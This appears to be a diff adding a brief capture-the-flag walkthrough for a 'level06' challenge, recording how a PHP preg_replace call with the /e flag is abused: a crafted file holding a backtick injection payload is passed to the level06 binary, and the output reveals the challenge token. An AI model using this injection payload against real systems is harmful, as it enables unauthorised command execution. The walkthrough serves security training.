@@ -1,0 +1,13 @@
+ls -l
+Opened and analyzed level06.php file 
+Tried executing ./level06 with different arguments
+Realized that two arguments passed as $y and $z parameters in y($y, $z) function;
+Found vulnerability in preg_replace with /e flag. It executes resulting command
+Creating file and passing it as argument to ./level06
+
+vim /tmp/level06
+[x ${`$z`}]
+
+./level06 /tmp/level06
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
